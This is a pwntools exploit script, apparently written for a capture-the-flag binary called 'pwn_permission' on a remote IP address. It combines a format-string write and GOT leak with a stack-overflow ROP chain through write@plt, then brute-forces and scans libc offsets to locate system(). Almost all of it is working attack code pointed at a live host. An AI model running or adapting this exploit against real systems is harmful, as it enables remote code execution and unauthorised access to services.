from pwn import *

context(arch='i386', os='linux', log_level='info')

elf = ELF('pwn_permission')

# libc puts works, but system crashes
# This means either:
# 1. system offset is wrong
# 2. system() has some internal issue (stack alignment, etc.)

# Let me verify by reading the bytes at the system address
# and also try different system offsets

target_val_addr = 0x804c030
puts_got = elf.got['puts']
got_base = 0x804c000
bss_buf = 0x804c040

PUTS_OFFSET = 0x6d1e0

# Format string
fmt_payload = b'%5c%7$hhnAAA'
fmt_payload += p32(target_val_addr)
fmt_payload += p32(puts_got)
fmt_payload += b'%8$s'

# Use write@plt to read bytes at system address
write_plt = elf.plt['write']
pop4ret = 0x8049380

import time

# Try different system offsets and verify each one
system_offsets = [
    0x41360,   # libc6-i386_2.31-0ubuntu9.11
    0x41370,   # libc6-i386_2.31-0ubuntu9.7
    0x3cd10,   # Different libc version
    0x3cd60,
    0x3a6e0,   # Another possibility
    0x41490,
    0x41350,
    0x41340,
]

for sys_off in system_offsets:
    try:
        conn = remote('39.96.193.120', 10000)
        conn.recv(timeout=5)
        
        conn.send(fmt_payload)
        time.sleep(2)
        response = conn.recv(timeout=5)
        
        if b'Input:' not in response:
            conn.close()
            continue
        
        idx = response.find(b'here.\n')
        after_here = response[idx+6:]
        input_idx = after_here.find(b'Input:')
        fmt_output = after_here[:input_idx]
        leaked = fmt_output[16:]
        puts_leak = u32(leaked[:4])
        libc_base = puts_leak - PUTS_OFFSET
        system_addr = libc_base + sys_off
        
        # Use write to read 8 bytes at system_addr
        payload = b'A' * 140
        payload += p32(got_base)
        payload += p32(bss_buf)
        payload += p32(write_plt)
        payload += p32(pop4ret)
        payload += p32(1)               # fd = stdout
        payload += p32(system_addr)     # buf = system_addr
        payload += p32(8)               # count = 8
        
        conn.send(payload)
        time.sleep(1)
        
        try:
            system_bytes = conn.recv(8, timeout=3)
            log.info(f"system+0x{sys_off:x}: {system_bytes.hex()} = {system_bytes}")
            
            # Check for valid function prologue
            # endbr32 = f3 0f 1e fb
            # push ebp = 55
            # push ebx = 53
            # mov eax, ... = 8b ...
            if system_bytes[:4] == b'\xf3\x0f\x1e\xfb':
                log.success(f"0x{sys_off:x}: endbr32 found! This is likely system()")
            elif system_bytes[0] == 0x55:
                log.success(f"0x{sys_off:x}: push ebp found! This might be system()")
            elif system_bytes[0] == 0x53:
                log.info(f"0x{sys_off:x}: push ebx found")
            else:
                log.info(f"0x{sys_off:x}: first byte = 0x{system_bytes[0]:02x}")
        except:
            log.info(f"0x{sys_off:x}: crashed during read")
        
        conn.close()
    except:
        continue

# Now let me also try to find the correct system offset
# by searching for the "endbr32" pattern at different offsets
log.info("\nSearching for system by scanning libc...")

conn = remote('39.96.193.120', 10000)
conn.recv(timeout=5)

conn.send(fmt_payload)
time.sleep(2)
response = conn.recv(timeout=5)

idx = response.find(b'here.\n')
after_here = response[idx+6:]
input_idx = after_here.find(b'Input:')
fmt_output = after_here[:input_idx]
leaked = fmt_output[16:]
puts_leak = u32(leaked[:4])
libc_base = puts_leak - PUTS_OFFSET
log.info(f"libc base: 0x{libc_base:x}")

# Scan around the expected system offset
for offset in range(0x41000, 0x42000, 0x10):
    try:
        addr = libc_base + offset
        
        payload = b'A' * 140
        payload += p32(got_base)
        payload += p32(bss_buf)
        payload += p32(write_plt)
        payload += p32(pop4ret)
        payload += p32(1)
        payload += p32(addr)
        payload += p32(4)
        
        conn.send(payload)
        time.sleep(0.3)
        
        try:
            data = conn.recv(4, timeout=1)
            if data[:4] == b'\xf3\x0f\x1e\xfb':
                log.success(f"Found endbr32 at offset 0x{offset:x} (addr 0x{addr:x})")
                # Read more bytes to verify
                log.info(f"Bytes: {data.hex()}")
        except:
            pass
    except:
        # Reconnect if needed
        try:
            conn.close()
        except:
            pass
        conn = remote('39.96.193.120', 10000)
        conn.recv(timeout=5)
        conn.send(fmt_payload)
        time.sleep(2)
        conn.recv(timeout=5)

conn.close()